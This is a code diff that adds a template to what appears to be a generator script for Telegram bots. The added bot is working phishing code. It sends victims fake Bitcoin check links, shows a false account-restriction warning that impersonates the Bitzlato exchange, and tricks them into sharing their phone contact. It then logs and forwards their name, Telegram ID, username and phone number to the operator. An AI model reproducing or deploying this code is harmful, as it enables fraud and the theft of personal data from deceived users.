@@ -597,6 +597,93 @@ bot.polling()
         f.close()
         print("The acquaintance.py file is saved")
 
+ elif choice == 5:
+        # Code for choice 5 (Acquaintance)
+        f = open('acquaintance1.py', 'w+', encoding='utf-8')
+        f.write(f"""
+import telebot
+from telebot import types
+import time
+import random
+
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+bot.send_message(ID, '!BOT STARTED!') 
+print("Bot launched!") 
+
+
+@bot.message_handler(commands=['admin'])
+def adm(message):
+	if message.from_user.id == int(ID):
+		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n \\n Enter the amount for which to create Fack BTC Received:') 
+		bot.register_next_step_handler(msg, check)
+def check(message):
+	try:
+		if message.text.isdigit():
+			bot.send_message(ID, f'User Received: {{message.text}}')
+			bot.send_message(ID, f'Your check: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
+		else:
+			bot.send_message('The value must be numeric!')
+
+	except Exception as e:
+		print(e)
+
+@bot.message_handler(commands=['start'])
+def start(message):
+	if message.from_user.id == int(ID):
+		bot.send_message(ID, 'Welcome to the bot! \\n To enter the admin panel, write: /admin') 
+	else:
+		try:
+			summ = message.text.split()[1]
+			userid = message.chat.id
+			bot.send_message(ID, f'User with ID:{{userid}} "BTC" your check for the amount:{{summ}}')
+			bot.send_message(message.chat.id, f'''You received 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
+			time.sleep(1)
+			
+			m_id = message.chat.id
+			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			keyboard.add(button_phone)	
+			bot.send_message(message.chat.id, "Warning >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+		
+		except Exception as e:
+			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			keyboard.add(button_phone)	
+			bot.send_message(message.chat.id, "Warning >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			userid = message.chat.id
+			bot.send_message(ID, f'User with ID:{{userid}} launched a bot!')
+
+@bot.message_handler(content_types=['contact']) 
+def contact(message):
+	if message.contact is not None: 
+		nick = message.from_user.username
+		first = message.contact.first_name
+		last = message.contact.last_name
+		userid = message.contact.user_id
+		phone = message.contact.phone_number
+		bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
+		info = f'''
+			Data
+			├Name: {{first}} {{last}}
+			├ID: {{userid}}
+			├Nok: @{{nick}}
+			└Phone number: {{phone}}
+			'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(info + '  ')
+		log.close()
+		bot.send_message(ID, info)
+		print(info)
+
+		if message.contact.user_id != message.chat.id:
+			bot.send_message(message.chat.id, '❌ Authorize Your contact!')
+	
+bot.polling()
+        """)
+        f.close()
+        print("The acquaintance1.py file is saved")
+
     else:
         print('Invalid choice')
 else:
